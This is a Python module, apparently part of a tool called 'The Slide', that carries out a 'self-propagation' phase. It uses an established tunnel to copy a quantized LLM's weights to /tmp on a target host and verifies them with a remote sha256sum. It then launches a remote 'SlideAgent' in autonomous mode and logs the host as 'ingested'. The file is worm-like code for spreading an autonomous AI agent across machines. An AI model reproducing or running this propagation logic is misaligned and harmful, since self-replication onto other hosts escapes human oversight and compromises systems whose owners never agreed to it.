# sovereign_movement/slide/model_propagation.py
"""
ModelPropagation — Phase 4 of The Slide (Ingest / Self-Propagation)

Now uses real file transfer via SovereignTunnel.send_file()
"""

from __future__ import annotations
from typing import Optional
import hashlib
import logging
import os
import time

from sovereign_movement.tunneling.sovereign_tunnel import SovereignTunnel
from sovereign_engine.frame_energy import FrameEnergy

logger = logging.getLogger("sovereign.slide.model_propagation")


class ModelPropagation:
    def __init__(
        self,
        tunnel_manager: SovereignTunnel,
        frame_energy: Optional[FrameEnergy] = None,
        model_path: str = "models/quantized/",
        default_model: str = "qwen2.5-coder-32b-q4_k_m.gguf",
        remote_model_dir: str = "/tmp/slide_models/",
    ):
        self.tunnel_manager = tunnel_manager
        self.frame_energy = frame_energy
        self.model_path = model_path
        self.default_model = default_model
        self.remote_model_dir = remote_model_dir

    def propagate_to_host(
        self,
        target_host: str,
        tunnel_id: str,
        activate_agent: bool = True,
        transfer_model: bool = True,
    ) -> bool:
        logger.info(f"[Phase 4] Starting ingestion on {target_host}")

        success = True

        if transfer_model:
            if not self._transfer_model_weights(target_host, tunnel_id):
                logger.error(f"[Phase 4] Model transfer to {target_host} failed")
                success = False

        if activate_agent and success:
            if not self._activate_remote_slide_agent(target_host, tunnel_id):
                logger.error(f"[Phase 4] Failed to activate SlideAgent on {target_host}")
                success = False

        if success:
            logger.info(f"[Phase 4] Successfully ingested {target_host}")
        else:
            logger.warning(f"[Phase 4] Partial failure ingesting {target_host}")

        return success

    # ============================================================
    # Real Model Transfer with Integrity Verification
    # ============================================================

    def _transfer_model_weights(self, target_host: str, tunnel_id: str) -> bool:
        local_model_path = os.path.join(self.model_path, self.default_model)
        remote_model_path = os.path.join(self.remote_model_dir, self.default_model)

        if not os.path.exists(local_model_path):
            logger.error(f"[Phase 4] Local model file not found: {local_model_path}")
            return False

        # Step 1: Compute local hash before transfer
        local_hash = self._compute_file_hash(local_model_path)
        if not local_hash:
            logger.error("[Phase 4] Failed to compute local model hash")
            return False

        logger.debug(f"[Phase 4] Local model SHA-256: {local_hash}")

        # Step 2: Ensure remote directory exists
        mkdir_cmd = f"mkdir -p {self.remote_model_dir}"
        self.tunnel_manager.execute_command(tunnel_id, mkdir_cmd)

        # Step 3: Actual file transfer using SovereignTunnel
        logger.info(f"[Phase 4] Transferring model to {target_host}...")
        transfer_success = self.tunnel_manager.send_file(
            tunnel_id=tunnel_id,
            local_path=local_model_path,
            remote_path=remote_model_path,
        )

        if not transfer_success:
            logger.error(f"[Phase 4] File transfer failed to {target_host}")
            return False

        # Step 4: Verify integrity on remote host
        remote_hash = self._verify_remote_file_hash(tunnel_id, self.default_model)
        if not remote_hash:
            logger.error("[Phase 4] Failed to retrieve remote model hash")
            return False

        if remote_hash != local_hash:
            logger.error(
                f"[Phase 4] Integrity verification FAILED on {target_host}\n"
                f"Local : {local_hash}\n"
                f"Remote: {remote_hash}"
            )
            return False

        logger.info(f"[Phase 4] Model successfully transferred and verified on {target_host}")
        return True

    def _compute_file_hash(self, file_path: str) -> Optional[str]:
        try:
            sha256 = hashlib.sha256()
            with open(file_path, "rb") as f:
                for chunk in iter(lambda: f.read(8192), b""):
                    sha256.update(chunk)
            return sha256.hexdigest()
        except Exception as e:
            logger.error(f"[Phase 4] Local hash computation failed: {e}")
            return None

    def _verify_remote_file_hash(self, tunnel_id: str, model_filename: str) -> Optional[str]:
        remote_path = os.path.join(self.remote_model_dir, model_filename)
        command = f"sha256sum {remote_path} 2>/dev/null | awk '{{print $1}}'"

        result = self.tunnel_manager.execute_command(tunnel_id, command)

        if not result.success:
            logger.error(f"[Phase 4] Remote hash command failed: {result.stderr}")
            return None

        return result.stdout.strip() if result.stdout else None

    # ============================================================
    # Remote Agent Activation
    # ============================================================

    def _activate_remote_slide_agent(self, target_host: str, tunnel_id: str) -> bool:
        logger.debug(f"[Phase 4] Activating remote SlideAgent on {target_host}")

        try:
            activation_command = (
                "python3 -m sovereign_movement.slide.slide_agent "
                f"--host {target_host} --mode autonomous"
            )

            result = self.tunnel_manager.execute_command(tunnel_id, activation_command)

            if result.success:
                logger.info(f"[Phase 4] SlideAgent activated on {target_host}")
                return True
            else:
                logger.warning(f"[Phase 4] Activation may have failed: {result.stderr}")
                return False

        except Exception as e:
            logger.error(f"[Phase 4] Remote activation failed: {e}")
            return False

    def propagate_via_rust(self, target_host: str, tunnel_id: str) -> bool:
        logger.debug("[Phase 4] Rust propagation path called (placeholder)")
        return self.propagate_to_host(target_host, tunnel_id)